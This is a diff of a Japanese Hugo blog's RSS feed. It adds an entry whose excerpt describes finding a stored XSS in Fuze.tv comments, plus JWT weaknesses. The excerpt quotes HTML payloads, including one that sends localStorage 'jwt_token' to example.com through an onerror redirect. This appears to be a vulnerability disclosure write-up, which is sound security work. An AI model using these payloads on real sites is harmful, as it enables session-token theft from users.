@@ -6,7 +6,26 @@
     <description>Recent content in Posts on 水の飲み方を忘れないための備忘録</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>ja-jp</language>
-    <lastBuildDate>Wed, 07 Jul 2021 13:58:40 +0900</lastBuildDate><atom:link href="https://lutwidse.github.io/post/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Wed, 28 Jul 2021 18:11:51 +0900</lastBuildDate><atom:link href="https://lutwidse.github.io/post/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Fuze.tvに脆弱性を見つけた話</title>
+      <link>https://lutwidse.github.io/post/fuze.tv-high-impact-xss/</link>
+      <pubDate>Wed, 28 Jul 2021 18:11:51 +0900</pubDate>
+      
+      <guid>https://lutwidse.github.io/post/fuze.tv-high-impact-xss/</guid>
+      <description>TL;DR Fuze.tv のコメントに蓄積型 XSS を投稿することが可能であり、
+下記の方法から Fuze.tv を利用する約 55 万人1すべてのユーザーに影響を及ぼすことが可能だった。
+またJWT の実装不備もあり、結果的に完全なサービス妨害に繋げることができた。
+Fuze.tv とは ゲームのクリップを共有するサイト。
+クライアントは Overwolf に依存。
+調査理由 友達が使っていて面白そうだと思ったので、バグがないか探してみることにした。
+初期調査 コメントに XSS が投稿できないか WAF を調べてみる。
+すると&amp;lt;script&amp;gt;は削除されてしまい、また http/https や href の文字 が &amp;lt;a href&amp;gt; タグ に変換されることが分かった。
+次に html タグが埋め込めないか確認したところ XSS が発火。
+このときはまだ限定的な条件下での攻撃と考えていた。
+&amp;lt;XSS onpointerup=&amp;#34;alert(1)&amp;#34;&amp;lt;h1&amp;gt;XSS&amp;lt;/h1&amp;gt;&amp;lt;/XSS&amp;gt; &amp;lt;div class=&amp;#34;comments-content&amp;#34;&amp;gt; &amp;lt;div compile-content-parser=&amp;#34;::$ctrl.item.message&amp;#34;&amp;gt; &amp;lt;vuln onpointerup=&amp;#34;var i=new Image;i.src=&amp;#34;http://example.com/?&amp;#34;+123;&amp;#34; class=&amp;#34;ng-scope&amp;#34;&amp;gt;&amp;lt;h1&amp;gt;Crafted comment&amp;lt;/h1&amp;gt; &amp;lt;/vuln&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;video&amp;gt; &amp;lt;source onerror=location=/\example.com/+localStorage.getItem(&amp;#34;jwt_token&amp;#34;)&amp;gt; &amp;lt;/video&amp;gt; Iframe を使った XSS Content-Security-Policy が設定されておらず、 Iframe から XSS を入力することができた。</description>
+    </item>
+    
     <item>
       <title>HugoとGitHub Pagesでブログを作成した話</title>
       <link>https://lutwidse.github.io/post/2021-07-07-create-blog-with-hugo/</link>
